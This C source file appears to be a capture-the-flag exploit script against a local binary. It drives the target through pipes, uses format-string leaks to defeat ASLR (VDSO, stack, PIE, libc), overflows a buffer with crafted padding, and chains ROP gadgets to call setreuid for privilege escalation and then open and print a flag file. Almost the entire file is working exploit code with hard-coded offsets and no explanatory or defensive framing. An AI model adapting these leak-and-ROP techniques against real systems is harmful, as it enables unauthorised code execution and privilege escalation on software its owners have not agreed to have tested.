#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>

int parent_to_child[2];
int child_to_parent[2];
char tmp[50];
char *tmpPtr = NULL;

void sendLine(const char* input){
  write(parent_to_child[1], input, strlen(input));
}

void send(const char* input, size_t size){
  write(parent_to_child[1], input, size);
}

char* recv(size_t size){
  char *buffer = malloc(size);
  size_t total = 0; char* ptr = buffer;
  while(total < size){
    ssize_t n = read(child_to_parent[0], ptr, size-total);
    if (n > 0) {
      ptr += n;
      total += n;
    }
    else {
      buffer[total] = '\0';
      return buffer;
    }
  }
  return buffer;
}

void padChunk(char *buff, size_t size, size_t maxSize){
  buff += size;
  while(maxSize-size){
    *buff = 'A';
    buff++;
    size++;
  }
  *buff = '\0';
}

char* subStr(char* s, size_t count){
  char* res = malloc(count+1);
  char *ptr=res;
  while(count--){
    *ptr = *s;
    ptr++;
    s++;
  }
  *ptr = '\0';
  return res;
}

unsigned long hexToUL(char *x){
  return strtol(x, NULL, 16);
}

char* addP64Bytes(char *s, unsigned long adr){
  char *bytes = &adr;
  for(int i=0; i<8; i++){
    *s = *bytes;
    s++;
    bytes++;
  }
  return s;
}

void recvPrint(size_t size){
  char *output = recv(size);
  if (output == NULL) {
    printf("FAIL\n");
    exit(-1);
  }
  printf("Out: %s\n", output);
  fflush(stdout);
  free(output);
}

void logh(const char* msg, unsigned long x){
  printf("%s: %lx\n", msg, x);
}

int main() {

    if (pipe(parent_to_child) == -1 || pipe(child_to_parent) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }

    pid_t child_pid = fork();

    if (child_pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }

    if (child_pid == 0) { // Child process
        close(parent_to_child[1]);
        close(child_to_parent[0]);

        // Redirect stdin and stdout to the pipes
        dup2(parent_to_child[0], STDIN_FILENO);
        dup2(child_to_parent[1], STDOUT_FILENO);

        // Close the unnecessary ends of the pipes
        close(parent_to_child[0]);
        close(child_to_parent[1]);

        // Execute the other ELF binary
        execl("./main", NULL, NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else { // Parent process
        close(parent_to_child[0]);
        close(child_to_parent[1]);
        
        system("ps");

        // Write to the child process's stdin
        sendLine("2\n");
        
        // Leak VDSO
        sendLine("1\n");
        sendLine("4\n");
        //sendLine("14\n");

        // Read from the child process's stdout
        char *output = recv(200);
        if (output == NULL) {
          printf("FAIL\n");
          exit(-1);
        }
        unsigned long vd_base = hexToUL(subStr(strstr(output, "0x"), 14));
        logh("vd base", vd_base);
        free(output);
        
        // Leak Stack
        
        sendLine("1\n");
        sendLine("40\n");
        //sendLine("14\n");

        // Read from the child process's stdout
        output = recv(92);
        if (output == NULL) {
          printf("FAIL\n");
          exit(-1);
        }
        unsigned long stack_leak = hexToUL(subStr(strstr(output, "0x"), 14)) & 0xfffffffffffffff0;
        logh("stack_leak", stack_leak);
        free(output);
        
        // Leak PIE
        sendLine("1\n");
        sendLine("14\n");
        
        output = recv(92);
        if (output == NULL) {
          printf("FAIL\n");
          exit(-1);
        }
        unsigned long pie_base = hexToUL(subStr(strstr(output, "0x"), 14)) - 0x40;
        logh("Pie base", pie_base);
        free(output);
        
        int LOCAL = 0;
        // Stage 1
        unsigned long ret = vd_base + (LOCAL ? 0x00000000000005fe : 0x000000000000078c);
        unsigned long xor_eax = vd_base + (LOCAL ? 0x0000000000000c1e : 0x0000000000000ca1);
        unsigned long exe_printf = pie_base + 0x0000000000001060;
        unsigned long exe_start = pie_base + 0x00000000000010f0;
        unsigned long exe_writeable = pie_base + 0x4000;
        unsigned long pop_rbp = pie_base + 0x0000000000001357;
        unsigned long plt_read = pie_base + 0x0000000000001070;
        
        logh("ret", ret);
        logh("xor_eax", xor_eax);
        
        char* path = malloc(80);
        strcpy(path, "LIBCLEAK.%9$p.");
        padChunk(path, strlen(path), 72);
        addP64Bytes(path+72, ret);
        *(path+72+6) = '\n';
        //write(1, payload+72, 8);
        
        sendLine("aaa\n");
        sendLine("2\n");
        recvPrint(124);
        send(path, strlen(path));
        //free(payload); needed later on
        
        recvPrint(61);
        
        sendLine("3\n");
        recvPrint(48);
        
        sendLine("1\n");
        recvPrint(16);
        
        /*
        rop = b"\0"*2
        rop += p64(xor_eax)
        rop += p64(ret)
        rop += p64(pie_base + exe.symbols.printf)
        rop += p64(pie_base + exe.symbols._start)
        */
        char *payload = malloc(50);
        *payload = '\0';
        *(payload+1) = '\0';
        tmpPtr = payload+2;
        tmpPtr = addP64Bytes(tmpPtr, xor_eax);
        tmpPtr = addP64Bytes(tmpPtr, ret);
        tmpPtr = addP64Bytes(tmpPtr, exe_printf);
        tmpPtr = addP64Bytes(tmpPtr, exe_start);
        //write(1, payload, 18);
        
        //read(0, tmp, 2);
        send(payload, 8*4+2);
        free(payload);
        
        output = recv(40);
        if (output == NULL) {
          printf("FAIL\n");
          exit(-1);
        }
        unsigned long libc_base = hexToUL(subStr(strstr(output, "0x"), 14)) - (LOCAL ? 162634 : 157224);
        free(output);
        
        unsigned long pop_rsi = (LOCAL ? 0x000000000008a36e : 0x0000000000027e42) + libc_base;
        unsigned long pop_rdi = (LOCAL ? 0x00000000000fb22d : 0x0000000000026b10) + libc_base;
        unsigned long setreuid = (LOCAL ? 0x107480 : 0xc5651) + libc_base;
        unsigned long binsh = (LOCAL ? 0x19ddef : 0x1445f0) + libc_base;
        unsigned long system = (LOCAL ? 0x4f390 : 0x40fb7) + libc_base;
        unsigned long gets = (LOCAL ? 0x78590 : 0x5e639) + libc_base;
        unsigned long pop_rsp = (LOCAL ? 0x0000000000036c98 : 0x0000000000026849) + libc_base;
        unsigned long libc_open = (LOCAL ? 1052144 : 790361) + libc_base;
        unsigned long pop_rdx = (LOCAL ? 0 : 0x000000000002688e) + libc_base;
        unsigned long libc_write = (LOCAL ? 0 : 791032) + libc_base;
        
        logh("Libc base", libc_base);
        logh("pop_rsi", pop_rsi);
        logh("pop_rdi", pop_rdi);
        logh("setreuid", setreuid);
        logh("binsh", binsh);
        logh("system", system);
        
        //read(0, tmp, 50);
        //system(tmp);
        
        recvPrint(96);
        
        // Escalate priv
        
        /*
        sendl("2")
        sendl("2")
        sendl(path)
        sendl("3")
        */
        sendLine("2\n");
        sendLine("2\n");
        
        recvPrint(63);
        //printf("%s", path);
        send(path, strlen(path));
        //free(path);
        
        recvPrint(61);
        sendLine("3\n");
        recvPrint(48);
        
        /*
        sendl("1")
        rop = b"\0"*2
        # rop += p64(ret)
        rop += p64(pop_rdi) + p64(1000)
        rop += p64(pop_rsi) + p64(1000)
        rop += p64(libc_base + libc.symbols.setreuid)
        rop += p64(pie_base + exe.symbols._start)
        sendl(rop)
        */
        sendLine("1\n");
        recvPrint(16);
        
        payload = malloc(55);
        *payload = '\0';
        *(payload+1)='\0';
        tmpPtr = payload+2;
        tmpPtr = addP64Bytes(tmpPtr, pop_rdi);
        tmpPtr = addP64Bytes(tmpPtr, 6969);
        tmpPtr = addP64Bytes(tmpPtr, pop_rsi);
        tmpPtr = addP64Bytes(tmpPtr, 6969);
        tmpPtr = addP64Bytes(tmpPtr, setreuid);
        tmpPtr = addP64Bytes(tmpPtr, exe_start);
        
        read(0, tmp, 2);
        send(payload, 8*6+2);
        free(payload);
        
        recvPrint(48);
        
        // Final stage, pop a shell
        sendLine("2\n");
        sendLine("2\n");
        
        recvPrint(63);
        //printf("%s", path);
        send(path, strlen(path));
        free(path);
        
        recvPrint(61);
        sendLine("3\n");
        recvPrint(48);
        
        /*
        sendl("1")
        rop = b"\0"*2
        # rop += p64(ret)
        rop += p64(pop_rdi) + p64(libc_base + next(libc.search(b'/bin/sh')))
        rop += p64(libc_base + libc.symbols.system)
        sendl(rop)
        */
        sendLine("1\n");
        recvPrint(16);
        
        payload = malloc(55);
        *payload = '\0';
        *(payload+1)='\0';
        tmpPtr = payload+2;
        tmpPtr = addP64Bytes(tmpPtr, pop_rdi);
        tmpPtr = addP64Bytes(tmpPtr, stack_leak-0x500);
        tmpPtr = addP64Bytes(tmpPtr, gets);
        tmpPtr = addP64Bytes(tmpPtr, pop_rsp);
        tmpPtr = addP64Bytes(tmpPtr, stack_leak-0x500);
        
        send(payload, 8*5+2);
        free(payload);
        
        /*
        open("/flag")
        read(3, mem, 20)
        write(1, mem, 20)
        */
        payload = malloc(6+8*50+1);
        //for(int i=0; i<6; i++) payload[i] = 0;
        //tmpPtr = addP64Bytes(tmpPtr, 0xdeadbeef);
        tmpPtr = payload;
        tmpPtr = addP64Bytes(tmpPtr, pop_rbp);
        tmpPtr = addP64Bytes(tmpPtr, stack_leak);
        tmpPtr = addP64Bytes(tmpPtr, xor_eax);
        tmpPtr = addP64Bytes(tmpPtr, pop_rsi);
        tmpPtr = addP64Bytes(tmpPtr, 0);
        tmpPtr = addP64Bytes(tmpPtr, pop_rdi);
        tmpPtr = addP64Bytes(tmpPtr, stack_leak-0x500+ 8*19);
        tmpPtr = addP64Bytes(tmpPtr, libc_open);
        tmpPtr = addP64Bytes(tmpPtr, pop_rdi);
        tmpPtr = addP64Bytes(tmpPtr, 3);
        tmpPtr = addP64Bytes(tmpPtr, pop_rsi);
        tmpPtr = addP64Bytes(tmpPtr, stack_leak-0x200);
        tmpPtr = addP64Bytes(tmpPtr, pop_rdx);
        tmpPtr = addP64Bytes(tmpPtr, 100);
        tmpPtr = addP64Bytes(tmpPtr, plt_read);
        tmpPtr = addP64Bytes(tmpPtr, pop_rdi);
        tmpPtr = addP64Bytes(tmpPtr, 1);
        tmpPtr = addP64Bytes(tmpPtr, libc_write);
        tmpPtr = addP64Bytes(tmpPtr, 0xdeadbaeee);
        
        strcpy(tmpPtr, "flag\n");
        send(payload, 8*19+5);
        
        recvPrint(150);
        
        //dup2(child_to_parent[0], 1);
        //dup2(parent_to_child[1], 0);
        
        close(parent_to_child[1]);
        close(child_to_parent[0]);

        // Wait for the child process to complete
        int status;
        waitpid(child_pid, &status, 0);
    }

    return 0;
}


